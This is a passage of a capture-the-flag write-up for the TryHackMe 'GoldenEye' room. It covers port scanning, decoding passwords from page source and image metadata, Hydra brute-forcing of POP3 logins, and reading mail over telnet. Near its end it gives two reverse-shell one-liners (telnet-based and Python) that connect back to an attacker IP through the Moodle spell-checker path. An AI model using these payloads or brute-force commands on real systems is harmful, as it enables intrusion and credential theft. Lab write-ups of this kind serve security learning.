---
Bond, James Bond. A guided CTF.
---

# GoldenEye — Writeup

## Overview
### GoldenEye — Writeup
### GoldenEye — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/77b55a2ac1ac79ca534d6fc003c042b3.png)

## Enumeration
Start Machine
This room will be a guided challenge to hack the James Bond styled box and get root.
Credit to [creosote](https://www.vulnhub.com/author/creosote,584/) for creating this VM. This machine is used here with the explicit permission of the creator <3
So.. Lets get started!
Answer the questions below
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.146.26 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.146.26:25
Open 10.10.146.26:80
Open 10.10.146.26:55006
Open 10.10.146.26:55007
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 12:59 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:59
Completed Parallel DNS resolution of 1 host. at 12:59, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:59
Scanning 10.10.146.26 [4 ports]
Discovered open port 25/tcp on 10.10.146.26
Discovered open port 55007/tcp on 10.10.146.26
Discovered open port 80/tcp on 10.10.146.26
Discovered open port 55006/tcp on 10.10.146.26
Completed Connect Scan at 12:59, 0.20s elapsed (4 total ports)
Initiating Service scan at 12:59
Scanning 4 services on 10.10.146.26
Completed Service scan at 13:00, 28.54s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.146.26.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 4.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 3.07s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
Nmap scan report for 10.10.146.26
Host is up, received user-set (0.20s latency).
Scanned at 2023-02-03 12:59:34 EST for 36s

PORT      STATE SERVICE  REASON  VERSION
25/tcp    open  smtp     syn-ack Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:22:34
| Not valid after:  2028-04-21T03:22:34
| MD5:   cd4ad178f21617fb21a60a168f46c8c6
| SHA-1: fda3fc7b6601474696aa0f56b1261c2936e8442c
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAPokpqPNVgk6MA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMTBnVidW50dTAeFw0xODA0MjQwMzIyMzRaFw0yODA0MjEwMzIyMzRaMBExDzAN
| BgNVBAMTBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMM6
| ryxPHxf2wYf7DNTXnW6Hc6wK+O6/3JVeWME041jJdsY2UpxRB6cTmBIv7dAOHZzL
| eSVCfH1P3IS0dvSrqkA+zpPRK3to3SuirknpbPdmsNqMG1SiKLDl01o5LBDgIpcY
| V9JNNjGaxYBlyMjvPDDvgihmJwpb81lArUqDrGJIsIH8J6tqOdLt4DGBXU62sj//
| +IUE4w6c67uMAYQD26ZZH9Op+qJ3OznCTXwmJslIHQLJx+fXG53+BLiV06EGrsOk
| ovnPmixShoaySAsoGm56IIHQUWrCQ03VYHfhCoUviEw02q8oP49PHR1twt+mdj6x
| qZOBlgwHMcWgb1Em40UCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAfigEwPIFEL21yc3LIzPvHUIvBM5/fWEEv0t+8t5ATPfI6c2Be6xePPm6
| W3bDLDQ30UDFmZpTLgLkfAQRlu4N40rLutTHiAN6RFSdAA8FEj72cwcX99S0kGQJ
| vFCSipVd0fv0wyKLVwbXqb1+JfmepeZVxWFWjiDg+JIBT3VmozKQtrLLL/IrWxGd
| PI2swX8KxikRYskNWW1isMo2ZXXJpdQJKfikSX334D9oUnSiHcLryapCJFfQa81+
| T8rlFo0zan33r9BmA5uOUZ7VlYF4Kn5/soSE9l+JbDrDFOIOOLLILoQUVZcO6rul
| mJjFdmZE4k3QPKz1ksaCAQkQbf3OZw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
80/tcp    open  http     syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
55006/tcp open  ssl/pop3 syn-ack Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP CAPA USER SASL(PLAIN) AUTH-RESP-CODE PIPELINING RESP-CODES UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d0392e71c76a2cb3e694ec407228ec63
| SHA-1: 9d6a92eb5f9fe9ba6cbddc9355fa5754219b0b77
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd
| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3
| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr
| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/
| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM
| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w
| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi
| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi
| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45
| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a
| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so
| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm
| e1/vPH7tRtldZFSfflyHUsA=
|_-----END CERTIFICATE-----
55007/tcp open  pop3     syn-ack Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d0392e71c76a2cb3e694ec407228ec63
| SHA-1: 9d6a92eb5f9fe9ba6cbddc9355fa5754219b0b77
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd
| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3
| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr
| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/
| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM
| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w
| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi
| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi
| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45
| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a
| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so
| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm
| e1/vPH7tRtldZFSfflyHUsA=
|_-----END CERTIFICATE-----
|_pop3-capabilities: TOP SASL(PLAIN) UIDL CAPA USER STLS AUTH-RESP-CODE PIPELINING RESP-CODES

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:00
Completed NSE at 13:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.26 seconds

view-source:http://10.10.146.26/

<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="index.css">
</head>

	<span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="terminal.js"></script>
	
</html>

body {
  background: black;
}

span {
  color: red;
  font-family: monospace;
  font-size: 27;
}

.blinker {
  opacity: 1;
  margin-bottom: -2px;
  height: 15px;
  margin-left: -5px;
  border-left: 7px solid white;
  animation: blinker 0.9s steps(2, start) infinite;
}

@keyframes blinker {
  to { 
    visibility: hidden; 
  }
}

var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}

cyberchef

&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

From HTML entity

InvincibleHack3r
```
![[Pasted image 20230203130306.png]]
First things first, connect to our [network](http://access/) and deploy the machine.
Question Done
Use nmap to scan the network for all ports. How many ports are open?
nmap -p- -Pn <ip>
*4*
Take a look on the website, take a dive into the source code too and remember to inspect all scripts!
Question Done
Who needs to make sure they update their default password?
*Boris*
Whats their password?
*InvincibleHack3r*
Now go use those credentials and login to a part of the site.
Question Done
### Its mail time...
Onto the next steps..
Answer the questions below
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 25
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
220 ubuntu GoldentEye SMTP Electronic-Mail agent
HELO telnet
250 ubuntu
USER boris
502 5.5.2 Error: command not recognized
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 55007
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
-ERR Disconnected for inactivity.
Connection closed by foreign host.

BTW Natalya says she can break your codes
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3://10.10.146.26:55007 -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-03 13:39:23
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task
[DATA] attacking pop3://10.10.146.26:55007/
[STATUS] 159.00 tries/min, 159 tries in 00:01h, 86 to do in 00:01h, 41 active
[55007][pop3] host: 10.10.146.26   login: boris   password: secret1!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 11 final worker threads did not complete until end.
[ERROR] 11 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-03 13:40:43
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3://10.10.146.26:55007 -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-03 13:41:00
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task
[DATA] attacking pop3://10.10.146.26:55007/
[55007][pop3] host: 10.10.146.26   login: natalya   password: bird
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 13 final worker threads did not complete until end.
[ERROR] 13 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-03 13:41:43
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 55007
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user boris
+OK
pass secret1!
+OK Logged in.
LIST
+OK 3 messages:
1 544
2 373
3 921
.
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id D9E47454B1
	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id C3F2B454B1
	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 55007
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user natalya
+OK
pass bird
+OK Logged in.
LIST
+OK 2 messages:
1 631
2 1048
.
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
	by ubuntu (Postfix) with ESMTP id D5EDA454B1
	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 17C96454B1
	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

.
quit
+OK Logging out.
Connection closed by foreign host.
```
![[Pasted image 20230203135927.png]]
Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable?
Question Done
If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?
pop3
*secret1!*
Inspect port 55007, what services is configured to use this port?
*telnet*
Login using that service and the credentials you found earlier.
Question Done
What can you find on this service?
*emails*
What user can break Boris' codes?
*natalya*
Using the users you found on this service, find other users passwords
Question Done
Keep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.
You will eventually get a xenia's password in plaintext.
Completed
### GoldenEye Operators Training
Enumeration really is key. Making notes and referring back to them can be lifesaving. We shall now go onto getting a user shell.
Answer the questions below
```text
└─$ tail /etc/hosts           
10.10.167.117 team.thm
10.10.167.117 dev.team.thm
10.10.29.100 set.windcorp.thm
10.10.20.190 Osiris.windcorp.thm Osiris osiris.windcorp.thm
10.10.37.31  UNATCO
10.10.73.143 jack.thm
#127.0.0.1  newcms.mofo.pwn
10.200.108.33 holo.live 
10.200.108.33 www.holo.live admin.holo.live dev.holo.live
10.10.146.26  severnaya-station.com

view-source:http://severnaya-station.com/terminal.js

var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}

http://severnaya-station.com/gnocertdir/

http://severnaya-station.com/gnocertdir/login/index.php

after login

http://severnaya-station.com/gnocertdir/enrol/index.php?id=2

IDOR?

http://severnaya-station.com/gnocertdir/user/profile.php?id=0

Nope
The details of this user are not available to you

http://severnaya-station.com/gnocertdir/message/index.php?viewing=unread&user2=5

Tuesday, 24 April 2018
09:24 PM: Greetings Xenia,

As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.

My email username is...

doak

Thank you,

Cheers,

Dr. Doak "The Doctor"
Training Scientist - Sr Level Training Operating Supervisor
GoldenEye Operations Center Sector
Level 14 - NO2 - id:998623-1334
Campus 4, Building 57, Floor -8, Sector 6, cube 1,007
Phone 555-193-826
Cell 555-836-0944
Office 555-846-9811
Personal 555-826-9923
Email: doak@
Please Recycle before you print, Stay Green aka save the company money!
"There's such a thing as Good Grief. Just ask Charlie Brown" - someguy
"You miss 100% of the shots you don't shoot at" - Wayne G.
THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS.
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.10.146.26:55007 -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-03 14:05:03
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 222 login tries (l:1/p:222), ~4 tries per task
[DATA] attacking pop3://10.10.146.26:55007/
[55007][pop3] host: 10.10.146.26   login: doak   password: goat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-03 14:05:44

doak:goat
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ telnet 10.10.146.26 55007                                                          
Trying 10.10.146.26...
Connected to 10.10.146.26.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user doak
+OK
pass goat
+OK Logged in.
LIST
+OK 1 messages:
1 606
.
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
	by ubuntu (Postfix) with SMTP id 97DC24549D
	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
QUIT
+OK Logging out.
Connection closed by foreign host.

Login

http://severnaya-station.com/gnocertdir/

http://severnaya-station.com/gnocertdir/user/files.php

For James --- secret.txt

007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ wget http://10.10.146.26/dir007key/for-007.jpg                                
--2023-02-03 14:11:52--  http://10.10.146.26/dir007key/for-007.jpg
Connecting to 10.10.146.26:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14896 (15K) [image/jpeg]
Saving to: ‘for-007.jpg’

for-007.jpg             100%[=============================>]  14.55K  73.2KB/s    in 0.2s    

2023-02-03 14:11:53 (73.2 KB/s) - ‘for-007.jpg’ saved [14896/14896]
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ exiftool for-007.jpg                                                 
ExifTool Version Number         : 12.52
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2018:04:24 20:40:02-04:00
File Access Date/Time           : 2023:02:03 14:11:53-05:00
File Inode Change Date/Time     : 2023:02:03 14:11:53-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066

admin: xWinter1995x!

http://severnaya-station.com/gnocertdir/

Search spell

There's a path aspell

sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'

let's replace it with
https://www.revshells.com/

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

Spell engine : PSSpellSpell

Now go to `Navigation > My profile > Blog > Add a new entry` and clik on the “Toggle spell checker” icon.
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337 
